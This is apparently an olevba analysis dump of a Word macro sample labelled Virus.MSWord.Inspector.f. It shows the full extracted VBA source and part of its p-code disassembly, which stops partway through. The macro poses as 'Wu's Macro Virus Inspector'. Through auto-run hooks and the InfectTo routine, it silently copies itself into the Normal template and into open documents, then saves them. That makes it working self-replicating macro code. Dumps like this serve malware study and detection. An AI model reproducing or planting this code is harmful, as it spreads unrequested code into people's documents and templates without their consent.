olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Inspector.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Inspector.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusInspect.bas 
in file: ./Virus.MSWord.Inspector.f - OLE stream: 'Macros/VBA/VirusInspect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Dim KillCount As Integer
Dim sAutoNames  As Variant

Dim bInited As Boolean
Dim LatestVer As Double
Dim g_VBCom As Variant
Dim DetectedList As New Collection
Const Logo As String = "Wu's Macro Virus Inspector "



Function Detected(doc As Variant) As Integer
Dim i As Integer
For i = 1 To DetectedList.count
  If (doc.Name = Detected List.Item(i)) Then
    Detected = i
    Exit Function
  End If
Next
    Detected = 0
End Function
Sub SetDetectedFlag(doc As Variant, ByVal f As Boolean)
Dim i As Integer
i = Detected(doc)
If (f) Then
    If (i < 1) Then
        DetectedList.Add (doc.Name)
    End If
Else
    If (i > 0) Then
        DetectedList.Remove (i)
    End If
End If
End Sub
Sub ClearReg()
While DetectedList.count > 0
    DetectedList.Remove (1)
Wend
End Sub



Sub DeleteCode(cm As Variant, ByVal st, n As Long)
KillCount = KillCount + 1
Call cm.DeleteLines(st, n)
ShowStatus ("Delete From Line " & st & "to " & st + n)
End Sub
Sub KillSub(cm As Variant, ByVal Name As String)
Dim i, n As Long
'Dim cmd As CodeModule

  If (Not cm.Find(Name, 1, 1, cm.CountOfLines + 1, 1)) Then
   Exit Sub
  End If
  On Error GoTo Err
   i = cm.ProcStartLine(Name, 0) 'vbext_pk_Proc)
   n = cm.ProcCountLines(Name, 0) ' vbext_pk_Proc)
    If (InStr(1, cm.Lines(i, 1), "Wu", vbTextCompare) < 1) Then
     Call DeleteCode(cm, i, n)
    End If
    Exit Sub
Err:
End Sub
Sub KillAutoMod(md As Variant)
Dim Name As Variant
        For Each Name In sAutoNames
               If (InStr(1, md.Name, Name, vbTextCompare) > 0) Then
                        Call KillSub(md, "MAIN")
               End If
        Next Name
 
End Sub

Sub KillVirus(doc As Variant) 'Document)
'VBProject
Dim prj As Variant 'VBProject
Dim obj As Variant
Dim Name As Variant
Dim j, n As Integer
Dim md As Variant 'CodeModule
Dim VBCom As Variant 'VBComponents
Dim count As Integer
Dim saved As Boolean

Call Init
If (Detected(doc)) Then
     Exit Sub
End If

 saved = doc.saved
 
    count = KillCount
    Set prj = doc.VBProject
    Set VBCom = prj.VBComponents
    For j = 1 To VBCom.count
     Set md = VBCom.Item(j).CodeModule
        Call KillAutoMod(md)
    Next j
    For j = 1 To VBCom.count
    Set md = VBCom.Item(j).CodeModule
        ShowStatus "Scanning In " & md.Name
        For Each Name In sAutoNames
         Call KillSub(md, Name)
        Next Name
        Call KillAutoMod(md)
    Next j
    
    Call SetDetectedFlag(doc, True)
'    prj.VBComponents(1).Activate
    If (KillCount > count) Then
        ClearReg
        If (saved) Then
            Call SafeSave(doc)
        Else
         doc.saved = False
        End If
    Else
     If (saved) Then
     doc.saved = True
     End If
    End If
 
 End Sub
 
 
 
 
 
Sub DetectAll()

Dim doc As Variant 'Document
For Each doc In Documents
 Call KillVirus(doc)
Next
For Each doc In Templates
 Call KillVirus(doc)
Next
If (KillCount > 0) Then
    ShowStatus "É±µô " & KillCount & "¸ö²¡¶¾£¡µ«Î´±£´æ"
Else
    ShowStatus "Î´·¢ÏÖºê²¡¶¾£¡"
End If
KillCount = 0
End Sub

 
 
 
  
 
Sub Init()
    Dim i As Integer
    Dim obj As Variant
    
    If (bInited) Then
        Exit Sub
    End If
    'MsgBox "Init"
    sAutoNames = Array("Document_Close", "Document_Open", _
    "AutoClose", "AutoOpen", "Document_New", "AutoExec", _
     "AutoNew", "AutoExit")
    Call SetAttr(Application.NormalTemplate.FullName, 32) 'vbArchive)
    Set obj = Application.NormalTemplate
    Call InfectTo(obj)
    KillCount = 0
    ClearReg
    bInited = True
End Sub
Sub AutoExec() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoExit() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoOpen() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoNew() 'Wu's Sub
 Call DetectAll
End Sub

Sub FileOpen() 'Wu's Sub
Dim doc As Document
With Dialogs(wdDialogFileOpen)
       
       
   
   If (.Show = -1) Then
    Call SetDetectedFlag(ActiveDocument.VBProject, False)
    Call DetectAll
   End If
End With
End Sub
Sub DocClose()
On Error GoTo normal
Call InfectTo(ActiveDocument)
normal:
On Error GoTo Skip

Skip:
End Sub

Function MsgMode(s As Variant) As Integer
 MsgMode = msoBalloonButtonYes
End Function
Sub ShowStatus(ByVal s As String)
StatusBar = s
End Sub

Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean = False)
    ShowStatus s
End Sub
Sub CopyTo(doc As Variant, NewName As String)
Dim NewDoc As Document
    doc.Activate
    Selection.WholeStory
    Selection.Copy
    Set NewDoc = Documents.Add
    NewDoc.Activate
    Selection.Paste
    doc.Close SaveChanges:=False
    On Error GoTo prompt
    NewDoc.SaveAs (NewName)
    Exit Sub
prompt:
    With Dialogs(wdDialogFileSaveAs)
    .Name = NewName
    .fileformat = wdFormatDocument
    .Show
    End With
End Sub
Sub KillFile(Path As String)
Dim r As Integer
    r = MsgBox("ÊÇ·ñ½«´ø¶¾ÎÄ¼þ" & Path & " É¾³ý£¿", vbYesNoCancel, Logo)
    If (r = vbCancel) Then
     End
    Else
     If (r = vbNo) Then
        Exit Sub
     End If
    End If
    On Error GoTo Err
    Kill (Path)
    Call ShowStatus(Path & "Killed!")
    Exit Sub
Err:
    Call ShowStatus("Can not kill file " & Path)

End Sub
Sub SafeSave(doc As Variant)
'
'Dim doc As Document
Dim NewName As String
Dim r As Integer
Dim Path As String
Dim NewDoc As Document
Dim TempName As String
Dim Format As Integer


   NewName = doc.FullName
   On Error GoTo nextline
   Call SetAttr(doc.FullName, vbArchive)
nextline:
   On Error GoTo IsTemp
    Format = doc.SaveFormat
   If (Format = 1) Then
    GoTo IsTemp
   Else
    On Error GoTo ErrSave
    doc.SaveAs (NewName)
   End If
   Exit Sub
IsTemp:
   ' TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot"
'    MsgBox "open temp"
  '  doc.SaveAs FileName:=TempName, fileformat:=1
  '  doc.Close
 '   Kill TempName
 '   On Error GoTo NewDocErr
'    Set doc = Documents.Add(Template:=TempName)
   ' doc.SaveAs FileName:=NewName
Exit Sub
NewDocErr:
ErrSave:

   MsgBox "Ê§°Ü£¡"
   
End Sub


Function GetVer(prj As Variant) As Double
'Dim pprj As Variant 'VBProject
Dim VBCom As Variant 'VBComponent
Dim VerStr As String
Dim i As Integer
Const Tag As String = "Version"
GetVer = 0#
Set g_VBCom = Nothing
For Each VBCom In prj.VBComponents
   If (VBCom.CodeModule.Find(Logo, 1, 1, VBCom.CodeModule.CountOfLines + 1, 1)) Then
            Set g_VBCom = VBCom
            GetVer = 0.1
            On Error GoTo NoVer
            VerStr = VBCom.CodeModule.Lines(1, 1)
            i = InStr(1, VerStr, Tag, vbTextCompare)
            If (i > 0) Then
                GetVer = Val(Right(VerStr, Len(VerStr) - i - Len(Tag)))
            End If
NoVer:
            Exit Function
   End If
Next VBCom
End Function
Function GetLatest() As Variant
Dim prj As Variant 'VBProject
Dim Ver As Double
Set GetLatest = Nothing
LatestVer = 0
For Each prj In ThisDocument.Application.VBE.VBProjects
  Ver = GetVer(prj)
  If (Ver > LatestVer) Then
     LatestVer = Ver
     Set GetLatest = g_VBCom
  End If
Next prj
End Function
Sub setup()
   Call InfectTo(ThisDocument.Application.NormalTemplate)
   MsgBox "Installed " & Logo
   
  End Sub
  
 Function FoundMod(doc As Variant, ByVal s As String) As Variant
 Dim VBCom As Variant 'VBComponent
 For Each VBCom In doc.VBProject.VBComponents
  If (VBCom.Name = s) Then
  Set FoundMod = VBCom
  Exit Function
  End If
 Next
 Set FoundMod = Nothing
 End Function
 
Sub InfectTo(doc As Variant)
Dim prj As Variant 'VBProject
Dim VBCom, ObjCom As Variant 'VBComponent
Dim r As Double
Dim saved As Boolean


Const modname As String = "VirusInspect"
    
  saved = doc.saved
Set VBCom = GetLatest
r = GetVer(doc.VBProject)
Select Case (r)
 Case Is >= LatestVer: Exit Sub
 Case Else
        If (r > 0) Then
        Call ShowStatus("Upgraded£¡" & Logo)
        Else
        Call ShowStatus("Installed£¡" & Logo)
        End If
        Beep
        Beep
        Beep

 End Select
            
        Set ObjCom = FoundMod(doc, modname)
        If (ObjCom Is Nothing) Then
        Set ObjCom = doc.VBProject.VBComponents.Add(1) 'vbext_ct_StdModule  )
        ObjCom.Name = modname
        End If
        Call ObjCom.CodeModule.DeleteLines(1, ObjCom.CodeModule.CountOfLines)
        Call ObjCom.CodeModule.InsertLines(1, VBCom.CodeModule.Lines(1, VBCom.CodeModule.CountOfLines + 1))
 If (saved) Then
On Error Resume Next
 Call doc.SaveAs(doc.FullName)
 End If
 
End Sub














































































































































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Inspector.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1328 bytes
' Macros/VBA/VirusInspect - 20607 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' Line #3:
' 	Dim 
' 	VarDefn KillCount (As Integer)
' Line #4:
' 	Dim 
' 	VarDefn sAutoNames (As Variant) 0x0010
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn bInited (As Boolean)
' Line #7:
' 	Dim 
' 	VarDefn LatestVer (As Double)
' Line #8:
' 	Dim 
' 	VarDefn g_VBCom (As Variant)
' Line #9:
' 	Dim 
' 	VarDefn DetectedList (New )
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x001B "Wu's Macro Virus Inspector "
' 	VarDefn Logo (As String)
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Function Detected(doc As Variant) As Integer)
' Line #15:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DetectedList 
' 	MemLd count 
' 	For 
' Line #17:
' 	Reparse 0x002C "  If (doc.Name = Detected List.Item(i)) Then"
' Line #18:
' 	Ld i 
' 	St Detected 
' Line #19:
' 	ExitFunc 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	LitDI2 0x0000 
' 	St Detected 
' Line #23:
' 	EndFunc 
' Line #24:
' 	FuncDefn (Sub SetDetectedFlag(doc As Variant, ByVal False As Boolean))
' Line #25:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #26:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	St i 
' Line #27:
' 	Ld False 
' 	Paren 
' 	IfBlock 
' Line #28:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #29:
' 	Ld doc 
' 	MemLd New 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Add 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #33:
' 	Ld i 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Sub ClearReg())
' Line #38:
' 	Ld DetectedList 
' 	MemLd count 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #39:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #40:
' 	Wend 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' 	FuncDefn (Sub DeleteCode(cm As Variant, ByVal st, n As Long))
' Line #46:
' 	Ld KillCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St KillCount 
' Line #47:
' 	Ld st 
' 	Ld n 
' 	Ld cm 
' 	ArgsMemCall (Call) DeleteLines 0x0002 
' Line #48:
' 	LitStr 0x0011 "Delete From Line "
' 	Ld st 
' 	Concat 
' 	LitStr 0x0003 "to "
' 	Concat 
' 	Ld st 
' 	Ld n 
' 	Add 
' 	Concat 
' 	Paren 
' 	ArgsCall ShowStatus 0x0001 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub KillSub(cm As Variant, ByVal New As String))
' Line #51:
' 	Dim 
' 	VarDefn i
' 	VarDefn n (As Long)
' Line #52:
' 	QuoteRem 0x0000 0x0015 "Dim cmd As CodeModule"
' Line #53:
' Line #54:
' 	Ld New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #55:
' 	ExitSub 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	OnError Err 
' Line #58:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St i 
' 	QuoteRem 0x0021 0x000E "vbext_pk_Proc)"
' Line #59:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St n 
' 	QuoteRem 0x0022 0x000F " vbext_pk_Proc)"
' Line #60:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0002 "Wu"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #61:
' 	Ld cm 
' 	Ld i 
' 	Ld n 
' 	ArgsCall (Call) DeleteCode 0x0003 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ExitSub 
' Line #64:
' 	Label Err 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub KillAutoMod(md As Variant))
' Line #67:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #68:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld md 
' 	MemLd New 
' 	Ld New 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #70:
' 	Ld md 
' 	LitStr 0x0004 "MAIN"
' 	ArgsCall (Call) KillSub 0x0002 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub KillVirus(doc As Variant))
' 	QuoteRem 0x001E 0x0009 "Document)"
' Line #77:
' 	QuoteRem 0x0000 0x0009 "VBProject"
' Line #78:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #79:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #80:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #81:
' 	Dim 
' 	VarDefn j
' 	VarDefn n (As Integer)
' Line #82:
' 	Dim 
' 	VarDefn md (As Variant)
' 	QuoteRem 0x0012 0x000A "CodeModule"
' Line #83:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000C "VBComponents"
' Line #84:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #85:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #86:
' Line #87:
' 	ArgsCall (Call) Init 0x0000 
' Line #88:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	ExitSub 
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #93:
' Line #94:
' 	Ld KillCount 
' 	St count 
' Line #95:
' 	SetStmt 
' 	Ld doc 
' 	MemLd VBProject 
' 	Set prj 
' Line #96:
' 	SetStmt 
' 	Ld prj 
' 	MemLd VBComponents 
' 	Set VBCom 
' Line #97:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #98:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set md 
' Line #99:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #100:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #102:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set md 
' Line #103:
' 	LitStr 0x000C "Scanning In "
' 	Ld md 
' 	MemLd New 
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #104:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #105:
' 	Ld md 
' 	Ld New 
' 	ArgsCall (Call) KillSub 0x0002 
' Line #106:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #108:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' Line #110:
' 	Ld doc 
' 	LitVarSpecial (True)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #111:
' 	QuoteRem 0x0000 0x0020 "    prj.VBComponents(1).Activate"
' Line #112:
' 	Ld KillCount 
' 	Ld count 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #113:
' 	ArgsCall ClearReg 0x0000 
' Line #114:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #115:
' 	Ld doc 
' 	ArgsCall (Call) SafeSave 0x0001 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld doc 
' 	MemSt saved 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	ElseBlock 
' Line #120:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #121:
' 	LitVarSpecial (True)
' 	Ld doc 
' 	MemSt saved 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	FuncDefn (Sub DetectAll())
' Line #132:
' Line #133:
' 	Dim 
' 	VarDefn doc (As Variant)
' 	QuoteRem 0x0013 0x0008 "Document"
' Line #134:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #135:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #136:
' 	StartForVariable 
' 	Next 
' Line #137:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #138:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #139:
' 	StartForVariable 
' 	Next 
' Line #140:
' 	Ld KillCount 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #141:
' 	LitStr 0x0005 "É±µô "
' 	Ld KillCount 
' 	Concat 
' 	LitStr 0x0010 "¸ö²¡¶¾£¡µ«Î´±£´æ"
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #142:
' 	ElseBlock 
' Line #143:
' 	LitStr 0x000E "Î´·¢ÏÖºê²¡¶¾£¡"
' 	ArgsCall ShowStatus 0x0001 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #146:
' 	EndSub 
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' 	FuncDefn (Sub Init())
' Line #154:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #155:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #156:
' Line #157:
' 	Ld bInited 
' 	Paren 
' 	IfBlock 
' Line #158:
' 	ExitSub 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	QuoteRem 0x0004 0x000D "MsgBox "Init""
' Line #161:
' 	LineCont 0x0008 08 00 04 00 10 00 05 00
' 	LitStr 0x000E "Document_Close"
' 	LitStr 0x000D "Document_Open"
' 	LitStr 0x0009 "AutoClose"
' 	LitStr 0x0008 "AutoOpen"
' 	LitStr 0x000C "Document_New"
' 	LitStr 0x0008 "AutoExec"
' 	LitStr 0x0007 "AutoNew"
' 	LitStr 0x0008 "AutoExit"
' 	ArgsArray Array 0x0008 
' 	St sAutoNames 
' Line #162:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	LitDI2 0x0020 
' 	ArgsCall (Call) SetAttr 0x0002 
' 	QuoteRem 0x003A 0x000A "vbArchive)"
' Line #163:
' 	SetStmt 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	Set obj 
' Line #164:
' 	Ld obj 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #165:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #166:
' 	ArgsCall ClearReg 0x0000 
' Line #167:
' 	LitVarSpecial (True)
' 	St bInited 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub AutoExec())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #170:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub AutoExit())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #173:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #176:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub AutoNew())
' 	QuoteRem 0x000E 0x0008 "Wu's Sub"
' Line #179:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub FileOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #183:
' 	Dim 
' 	VarDefn doc (As Document)
' Line #184:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' 	MemLdWith Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #189:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	LitVarSpecial (False)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #190:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	EndWith 
' Line #193:
' 	EndSub 
' Line #194:
' 	FuncDefn (Sub DocClose())
' Line #195:
' 	OnError normal 
' Line #196:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #197:
' 	Label normal 
' Line #198:
' 	OnError Skip 
' Line #199:
' Line #200:
' 	Label Skip 
' Line #201:
' 	EndSub 
' Line #202:
' Line #203:
' 	FuncDefn (Function MsgMode(s As Variant) As Integer)
' Line #204:
' 	Ld msoBalloonButtonYes 
' 	St MsgMode 
' Line #205:
' 	EndFunc 
' Line #206:
' 	FuncDefn (Sub ShowStatus(ByVal s As String))
' Line #207:
' 	Ld s 
' 	St StatusBar 
' Line #208:
' 	EndSub 
' Line #209:
' Line #210:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean))
' Line #211:
' 	Ld s 
' 	ArgsCall ShowStatus 0x0001 
' Line #212:
' 	EndSub 
' Line #213:
' 	FuncDefn (Sub CopyTo(doc As Variant, NewName As String))
' Line #214:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #215:
' 	Ld doc 
' 	ArgsMemCall Activate 0x0000 
' Line #216:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #217:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #218:
' 	SetStmt 
' 	Ld Documents 
' 	MemLd Add 
' 	Set NewDoc 
' Line #219:
' 	Ld NewDoc 
' 	ArgsMemCall Activate 0x0000 
' Line #220:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #221:
' 	LitVarSpecial (False)
' 	ParamNamed SaveChanges 
' 	Ld doc 
' 	ArgsMemCall Close 0x0001 
' Line #222:
' 	OnError prompt 
' Line #223:
' 	Ld NewName 
' 	Paren 
' 	Ld NewDoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #224:
' 	ExitSub 
' Line #225:
' 	Label prompt 
' Line #226:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #227:
' 	Ld NewName 
' 	MemStWith New 
' Line #228:
' 	Ld wdFormatDocument 
' 	MemStWith fileformat 
' Line #229:
' 	ArgsMemCallWith Show 0x0000 
' Line #230:
' 	EndWith 
' Line #231:
' 	EndSub 
' Line #232:
' 	FuncDefn (Sub KillFile(Path As String))
' Line #233:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #234:
' 	LitStr 0x000E "ÊÇ·ñ½«´ø¶¾ÎÄ¼þ"
' 	Ld Path 
' 	Concat 
' 	LitStr 0x0007 " É¾³ý£¿"
' 	Concat 
' 	Ld vbYesNoCancel 
' 	Ld Logo 
' 	ArgsLd MsgBox 0x0003 
' 	St r 
' Line #235:
' 	Ld r 
' 	Ld vbCancel 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #236:
' 	End 
' Line #237:
' 	ElseBlock 
' Line #238:
' 	Ld r 
' 	Ld vbNo 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #239:
' 	ExitSub 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	OnError Err 
' Line #243:
' 	Ld Path 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #244:
' 	Ld Path 
' 	LitStr 0x0007 "Killed!"
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #245:
' 	ExitSub 
' Line #246:
' 	Label Err 
' Line #247:
' 	LitStr 0x0012 "Can not kill file "
' 	Ld Path 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #248:
' Line #249:
' 	EndSub 
' Line #250:
' 	FuncDefn (Sub SafeSave(doc As Variant))
' Line #251:
' 	QuoteRem 0x0000 0x0000 ""
' Line #252:
' 	QuoteRem 0x0000 0x0013 "Dim doc As Document"
' Line #253:
' 	Dim 
' 	VarDefn NewName (As String)
' Line #254:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #255:
' 	Dim 
' 	VarDefn Path (As String)
' Line #256:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #257:
' 	Dim 
' 	VarDefn TempName (As String)
' Line #258:
' 	Dim 
' 	VarDefn Format$ (As Integer)
' Line #259:
' Line #260:
' Line #261:
' 	Ld doc 
' 	MemLd FullName 
' 	St NewName 
' Line #262:
' 	OnError nextline 
' Line #263:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #264:
' 	Label nextline 
' Line #265:
' 	OnError IsTemp 
' Line #266:
' 	Ld doc 
' 	MemLd SaveFormat 
' 	St Format$ 
' Line #267:
' 	Ld Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #268:
' 	GoTo IsTemp 
' Line #269:
' 	ElseBlock 
' Line #270:
' 	OnError ErrSave 
' Line #271:
' 	Ld NewName 
' 	Paren 
' 	Ld doc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	ExitSub 
' Line #274:
' 	Label IsTemp 
' Line #275:
' 	QuoteRem 0x0003 0x0034 " TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot""
' Line #276:
' 	QuoteRem 0x0000 0x0016 "    MsgBox "open temp""
' Line #277:
' 	QuoteRem 0x0002 0x002E "  doc.SaveAs FileName:=TempName, fileformat:=1"
' Line #278:
' 	QuoteRem 0x0002 0x000B "  doc.Close"
' Line #279:
' 	QuoteRem 0x0001 0x0010 "   Kill TempName"
' Line #280:
' 	QuoteRem 0x0001 0x001A "   On Error GoTo NewDocErr"
' Line #281:
